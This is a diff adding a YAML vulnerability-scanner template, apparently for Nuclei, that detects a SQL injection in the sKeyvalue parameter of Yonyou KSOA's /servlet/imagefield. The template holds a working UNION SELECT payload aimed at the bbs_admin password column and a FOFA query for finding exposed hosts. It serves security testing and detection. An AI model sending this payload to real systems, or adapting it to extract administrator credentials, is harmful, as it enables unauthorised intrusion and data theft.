@@ -1,0 +1,26 @@
+id: NC-KSOA-servletimagefield-sqli
+
+info:
+  name: NC KSOA servletimagefield file sKeyvalue parameter SQL injection(用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入)
+  author: linfeng7z
+  severity: critical
+  tags: nc,yongyou,ksoa,servletimagefield,sqli
+  metadata:
+    fofa-query: 'app="用友-时空KSOA"'
+
+requests:
+  - raw:
+      - |
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) 5bGx5rW35LmL5YWz
+        Accept-Encoding: gzip, deflate
+        Connection:
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1, '0x098f6bcd4621d373cade4e832627b4f6')"
+          - "status_code_1 == 200"
+        condition: and
